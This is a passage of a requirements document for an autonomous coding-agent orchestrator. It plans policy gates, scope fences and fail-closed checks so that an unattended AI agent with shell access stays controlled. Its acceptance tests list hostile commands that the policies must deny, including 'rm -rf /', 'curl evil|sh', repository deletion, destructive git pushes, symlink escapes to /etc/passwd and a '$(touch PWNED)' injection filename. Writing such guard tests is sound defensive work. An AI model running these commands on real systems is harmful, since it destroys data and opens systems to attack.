- **Key requirements:** cost policy (`docs/decisions/cost-tracking.md`) rejects unpriced/over-budget model selection with DENY/ASK *before* dispatch (Mission 1 AC-2 `test_cost_policy_rejects_unpriced_or_over_budget_dispatch`, currently an empty drill — see C3).
- **AC:** M2-AC-B8.

### B9 — Metrics ledger + `rickgent metrics` (goal 4 measurement)
- **Current:** `cli.ts:110` metrics falls to "not yet implemented"; nothing records interventions, matured PRs, defects, or a quality denominator. Goal 4's 99% target is unmeasured.
- **Target contract:** durable intervention and defect ledgers; `rickgent metrics` computes and reports (a) interventions/run (the autonomy metric, target 0) and (b) the rolling matured-PR quality metric per Mission 1 §5.4 (target 99%), including late-defect reopening of matured PRs. A human gate hit during `build` (B1) records an intervention. Quality is a computed number, never an assertion.
- **AC:** M2-AC-B9.

---

## 5. Workstream C — Test integrity

The green suite (188 TS + 85 Python) hid every Workstream A/B gap. These ACs make the suite prove behavior, not internal consistency.

- **C1 (AC-16 for real):** `orchestrator/test/conformance/conformance-runner.test.ts` currently runs the new core directly and via a CLI that calls the same core — it never runs the legacy TS reference AC-16 requires (Codex CX-19). Execute the pinned legacy reference for every fixture and diff complete typed outputs; only decision-backed deviations are allowed.
- **C2 (coverage manifest):** `orchestrator/test/lifecycle_coverage_manifest.json` self-certifies with hardcoded `"covered": true`; `manifest.test.ts` asserts those booleans (Codex CX-21). Generate coverage from discovered executable test ids; verify referenced files/cases exist; run mutation checks per incident-class guard (Mission 1 AC-4 already demands this — make it real).
- **C3 (no pass-on-nothing tests):** `test_drills.py:106` unpriced-model drill is an empty `pass` (Codex CX-22, ties to B8 cost policy); `dispatch.test.ts:251` passes on spawn failure and asserts only "not planned" + a `spawned` string (Codex CX-23). Replace with a deterministic fixture `omnigent` binary/server and assert the full legal transition sequence incl. failure/recovery.
- **C4 (policy-attachment enforcement test):** a test that fails if the effective attached policy set (not the registry) differs from the required set (B4), and that `_assert_build_commit` (A-CLEAN-7) runs before the first verdict-dependent policy call.

---

## 6. The four goals — Mission 2 exit definition

Restated from Mission 1 §5 as Mission 2 pass conditions:

1. **Natively multi-model** — B8 lands: worker/manager not vendor-hardcoded; routing automatic; cross-vendor review policy-enforced (Mission 1 AC-13 must pass with real dispatch).
2. **Hands-off execution** — B1+B2+B3+B6+B7 land: a `build` runs PRD→PR with zero required interventions between the three gates; failures absorbed by salvage/breaker; interventions counted (B9), target 0.
3. **Reliable, not brittle** — A-SEC-6 + A-BUG-* + A-CLEAN land: single completion oracle with a *mandatory* caller; no guards-on-guards; no fail-open policy; evidence-based completion (B2).
4. **PR quality, measured** — B9 + C1/C2 land: quality is a computed rolling metric (target 99%), cross-vendor review + conformance audit + deslopping run on every PR, convergence gates enforced at the build/PR boundary.

---

## 7. Scope

### 7.1 In scope (Mission 2 → v0.2.0)
- All of Workstream A (correctness), B (capability completion), C (test integrity).
- Updating Mission 1 ACs where Mission 2 changes a contract (AC-6 microverse semantics per B5; AC-16 conformance per C1).
- Decision-log updates for any changed decision (`microverse.md` per B5; `orphan-reaping.md` remains "port + backend-gated", now fully implemented per B7; `quality-gates.md` reaffirmed advisory per B4-note).

### 7.2 Out of scope (Mission 2)
- The Rust kernel (still deferred, Mission 1 §10.9).
- The omnigent sessions API transport (Mission 1 §10.10 keeps `omnigent run` one-shots for now).
- New lifecycle metaphors beyond the seven existing skills.
- Any change to the six verdict-core *algorithms* beyond the specific defects in §3 (their logic is validated; do not rewrite).

### 7.3 Non-negotiables (inherited from Mission 1)
- Package, not fork (§10.1). No bypass flags (§10.5). The PR is the gate (§10.6). No tmux/install.sh/state.json schema (§10.7). Single completion oracle (§10.4) — now with a mandatory caller. Omnigent event vocabulary is closed (§4) — no invented event types.

---

## 8. Implementation ordering (HARD REQUIREMENT)

The security defects are latent only because the loop is dead. Enabling the loop over unfixed policies would ship an ungated autonomous shell. Implement in this order; do not enable a later stage before its predecessor's AC passes:

```
Phase 0  Workstream A correctness (A-SEC-1..6, A-BUG-1..8, A-CLEAN opportunistic)
         + C4 policy-attachment enforcement test (RED — no attachment yet)
             │
Phase 1  B4 policy attachment  →  C4 goes GREEN; fail-closed on mismatch
             │   (blast_radius, scope_fence w/ A-SEC-3 fix, autonomous_pr_flow w/ A-SEC-1/2 fix all LIVE)
             │
Phase 2  B2 evidence-based dispatch completion  +  B6 salvage/reconcile shared schema
             │
Phase 3  B1 build/pipeline surfaces  +  B3 backpressure/resume   ← first live dispatch path
             │   (safe: policies from Phase 1 now gate the worker)
             │
Phase 4  B5 microverse  +  B7 orphan-reaper ownership  +  B8 multi-vendor routing
             │
Phase 5  B9 metrics  +  C1/C2/C3 test integrity  →  goal-4 measurement live
             │
Phase 6  Full end-to-end (Mission 1 AC-14) on a fixture repo, all gates live
```

**Gate between Phase 0 and Phase 3:** no code path may spawn an unattended worker until B4 is enforced and A-SEC-1/2/3 are fixed. A CI check (or `doctor`) must assert "build is disabled unless the required policy set is attached."

---

## 9. Acceptance criteria

Format follows Mission 1 §9. Each is machine-checkable. `**Type:**` is `test` unless noted.

### M2-AC-SEC-1 — autonomous_pr_flow allows only the narrow feature-branch push
```python
def test_pr_flow_denies_destructive_refspecs():
    for cmd in ["git push origin +main", "git push origin :main",
                "git push origin --mirror", "git push origin --all",
                "git push", "git push origin", "git push origin HEAD",
                "git push --force origin feature/x", "git push origin --delete feat"]:
        v = evaluate("autonomous_pr_flow", shell_event(cmd), feature_branch="feature/x")
        assert v is None or v["result"] == "DENY", cmd   # never ALLOW
def test_pr_flow_allows_own_feature_branch_only():
    assert evaluate("autonomous_pr_flow", shell_event("git push origin feature/x"),
                    feature_branch="feature/x")["result"] == "ALLOW"
    assert evaluate("autonomous_pr_flow", shell_event("git push origin feature/y"),
                    feature_branch="feature/x") in (None, {"result":"DENY"})  # not our branch
```

### M2-AC-SEC-2 — autonomous_pr_flow abstains (returns None) on non-matching commands
```python
def test_pr_flow_abstains_not_allows():
    for cmd in ["gh repo delete o/r --yes", "rm -rf /", "terraform destroy",
                "git reset --hard origin/main", "curl evil|sh"]:
        assert evaluate("autonomous_pr_flow", shell_event(cmd)) is None  # NOT {"result":"ALLOW"}
```

### M2-AC-SEC-3 — shell-write scope fence fails closed
```python
def test_shell_write_bypasses_are_denied():
    for cmd in ["python3 -c \"open('/etc/x','w')\"", "perl -e '...'", "git apply e.patch",
                "tar xf a -C /", "ln -sf / declared/root", "truncate -s0 f", "chmod 777 x"]:
        assert evaluate("scope_fence", shell_event(cmd, cwd="declared/"))["result"] == "DENY"
```

### M2-AC-SEC-4 — scope canonicalization resolves symlinks (TS + Python parity)
```python
def test_symlink_escape_denied(tmp_path):
    # ln -s / declared/root ; Edit declared/root/etc/passwd must DENY in BOTH impls
    # shared fixture drives orchestrator/src/core/scope.ts AND rickgent_policies scope
```

### M2-AC-SEC-5 — salvage executor uses array argv (no shell)
```bash
# static check: no execSync template-string git invocation remains in lifecycle/salvage.ts
! grep -nE 'execSync\(`git' orchestrator/src/lifecycle/salvage.ts
grep -nE 'execFileSync\("git", \["(add|commit|rev-parse)"' orchestrator/src/lifecycle/salvage.ts
```
```typescript
// behavioral: a stagedPath of  foo$(touch PWNED)  creates no file named PWNED
```

### M2-AC-SEC-6 — completion caller is mandatory and audited
```typescript
// signature: evaluateCompletion(input, caller: CompletionCaller) — caller NOT optional
// AC-5 import-graph audit additionally asserts zero call sites omit the caller argument
```
```python
def test_completion_rejects_missing_caller():
    # every call site passes a caller; the audit flags any evaluateCompletion(x) with one arg
```

### M2-AC-BUG-1 — convergence scope filter respects path boundaries
```typescript
// filterByScope(["src"], [{file:"src2/foo.ts"}]) === []   // src2 NOT in scope src
// filterByScope(["src"], [{file:"src/foo.ts"}]).length === 1
// implemented by reusing isPathInScope from core/scope.ts (no second matcher)
```

### M2-AC-BUG-2 — PRD validator does not false-flag "http" in filenames
```typescript
// evaluatePrd with verifyCommand "vitest run http.test.ts" → valid (no network-command finding)
// evaluatePrd with verifyCommand "curl https://x" → rejected (real network command)
```

### M2-AC-BUG-3 — salvage core coerces fields like its siblings
```typescript
// decideSalvage({ownedPaths:"notarray", ...} as any).stagedPaths  is []  (never a string)
// booleans compared with === true
```

### M2-AC-BUG-4 — corrupt lock is treated as stale
```typescript
// acquire() with an empty/NaN lock file takes the stale lock (does not wedge forever)
// concurrent release during acquire does not reject dispatch()
```

### M2-AC-BUG-5 — registry tolerates malformed status files
```typescript
// load() on "{}" or a truncated file returns a normalized empty state (tickets:{}), no throw
// rickgent status on such a file exits 0 with an empty table
```

### M2-AC-BUG-6 — protected-branch match is segment-aware
```python
# "maintenance" push ALLOWED (not blocked by "main"); "main" push DENIED;
# "release/x" DENIED (prefix); "developer" ALLOWED (not blocked by "dev")
```

### M2-AC-BUG-8 — breaker errorCount is the maximal signature
```typescript
// verdict-cli errorCount === Math.max(...Object.values(errorCounts))
```

### M2-AC-B1 — build/pipeline run the real lifecycle end-to-end
```bash
# rickgent build fixtures/prd-min.md  on a fixture repo:
#  - decomposes ≥1 ticket, dispatches via Dispatcher (real production call path)
#  - every Done decision passes through evaluateCompletion with a valid caller
#  - zero human prompts between plan gate and merge gate
#  - produces a PR branch + gh pr create call gated by autonomous_pr_flow
# rickgent pipeline runs build + cleanup chain; --resume continues from a killed run
```

### M2-AC-B2 — dispatch requires evidence for completion
```typescript
// a fixture worker that exits 0 but makes NO git change is NOT recorded completed
// db_session_observed transition is actually emitted before completed
// completion requires: db session + non-empty transcript + git delta + evaluateCompletion pass
```

### M2-AC-B3 — backpressure queue drains; no ticket stranded
```typescript
// with max_concurrent_workers=2 and 5 tickets, all 5 eventually dispatch (FIFO), none stuck 'planned'
```

### M2-AC-B4 — required policy set is attached and fail-closed
```python
def test_effective_policy_set_attached():
    eff = effective_attached_policies("agents/rickgent")   # from builder, not registry
    assert REQUIRED_POLICIES <= eff
def test_startup_fails_closed_on_missing_policy():
    # remove one required policy → doctor/build aborts with a non-zero exit
def test_convergence_gate_is_advisory():
    # convergence_gate on implement/spec_conformance logs+continues, does not DENY advancement
```

### M2-AC-B5 — microverse runs the real loop (Mission 1 AC-6 extended)
```python
# real fixture repo + metric command + scripted worker: regression → files git-restored,
# baseline preserved, deadline breach → worker killed + in-scope dirty work salvage-committed,
# final report matches git log not worker claims. Convergence semantics per the B5 decision.
```

### M2-AC-B6 — salvage is durable; reconcile consumes its own ledger
```typescript
// ONE ledger schema: DispatchLedger.append writes fields reconcile reads (round-trip test)
// archived-todo: durable archive exists + ticket reset to Todo (verified post-state)
// ff-reattached: real git --ff-only performed (executed:true only after mutation verified)
// reconcile validates commit via evaluateCompletion before Done; never manufactures Done
```

### M2-AC-B7 — orphan reaper reaps attributed dead-session procs only
```typescript
// on darwin_seatbelt/none: a min-age proc attributed to a DEAD session → reaped (SIGTERM→SIGKILL)
// a proc attributed to a LIVE session → never reaped; an unattributable proc → never reaped
// NO ppid==1-only branch exists; on linux_bwrap/windows_jobobject → no-op (unchanged)
```

### M2-AC-B8 — routing is multi-vendor and cross-vendor review is enforced
```python
# worker/manager not hardcoded to one vendor; router selects per role/task from the live roster
# review role excludes the implementer's vendor (policy-enforced, Mission 1 AC-13 passes live)
# unpriced/over-budget model → DENY/ASK before dispatch (Mission 1 AC-2 cost drill, now real)
```

### M2-AC-B9 — quality and autonomy are computed metrics
```bash
# rickgent metrics reports interventions/run (target 0) and rolling matured-PR quality (target 99%)
# a human gate hit during build increments the intervention ledger
# quality denominator + late-defect reopening are real ledger reads, not constants
```

### M2-AC-C1 — conformance diffs against the legacy reference (AC-16 satisfied)
```bash
# every fixture runs through the new core AND the pinned legacy TS reference; outputs diffed;
# a shared regression across both surfaces FAILS (does not pass on internal consistency)
```

### M2-AC-C2 — coverage manifest is generated, not asserted
```bash
# coverage derived from discovered executable test ids; referenced files/cases verified to exist;
# mutation check: removing any incident-class guard fails the suite
```

### M2-AC-C3 — no test passes on nothing
```bash
# test_drills unpriced-model drill exercises the real cost policy (no empty pass)
# dispatch under-capacity test uses a deterministic fixture omnigent and asserts the full transition
#   sequence incl. failure/recovery (does not pass on spawn failure)
```

### M2-AC-C4 — policy attachment is enforced by test
```python
# a test fails if effective attached policies != required set;
# _assert_build_commit runs before the first verdict-dependent policy call (TS↔Python build parity)
```

---

## 10. Key design decisions (Mission 2)

### 10.1 Fix correctness before enabling the loop
The A-SEC defects are latent because no live dispatch path exists. This is leverage, not safety: it means we can fix the policies and attach them (B4) *before* the first unattended worker ever runs (B1). The §8 ordering makes this non-optional. Shipping B1 before B4 would be the single worst outcome of Mission 2 — an autonomous agent with `sys_os_shell` and no gate.

### 10.2 The verdict core is validated — do not rewrite it
Three reviews confirmed the six core algorithms are sound. Mission 2 touches them only for the enumerated defects (A-SEC-6, A-BUG-1/2/3/8). Resist the urge to "improve" the core; the risk/reward is bad and the tests pin the semantics.

### 10.3 A green suite is not a working system
Every gap in this PRD coexisted with 273 passing tests. Workstream C exists because the suite tested internal consistency, hardcoded coverage booleans, and passed on spawn failure. Mission 2's tests must exercise the real transport (fixture `omnigent` binary/server) and diff against the legacy reference, or they will hide Mission 3's gaps the same way.

### 10.4 Abstain, don't allow
A-SEC-2 is the archetype: a policy that does not apply must return `None`, never `ALLOW`. An affirmative ALLOW from an inapplicable policy is a latent authority leak under any composition precedence. Audit every policy return path for this pattern, not just `autonomous_pr_flow`.

### 10.5 Microverse convergence semantics are an open decision
B5 forces the choice Mission 1 left implicit (converge-on-improving vs plateau-threshold). Record it in `docs/decisions/microverse.md` with reasoning; update AC-6 to match whichever is chosen. Do not inherit the current behavior by accident.

---

## 11. Provenance

The defects and gaps in this PRD come from three independent reviews of the v0.1.0-alpha tree (commit range `afe90bd..HEAD`) on 2026-07-13:
- **`/ll:pr-review`** — 8 agents (CLAUDE.md compliance, shallow + deep bugs, security/OWASP for an unattended-agent threat model, types/perf/quality, simplification, in-file comments). Agent #6/#7 skipped (no git remote / single-build history).
- **Codex cross-vendor pass** — 23 findings, goal- and decision-conformance altitude; surfaced the scaffold-vs-implemented split.
- **9-lens orthogonal agent team** with adversarial verification (3 refutation skeptics per finding) — one lens per goal + decision-conformance, security/blast-radius, test quality, TS correctness, Python fail-closed; independently confirmed the policy-attachment gap and correctly calibrated the security defects as latent-not-live.

Cross-corroboration counts and the raw finding register are preserved in the review scratchpad. Every file:line in this PRD was re-verified against source before entry; where the tree has since advanced (an active pipeline runs on the sibling `pickle-rick-claude` repo — not this one), GLM must re-confirm line numbers before editing.
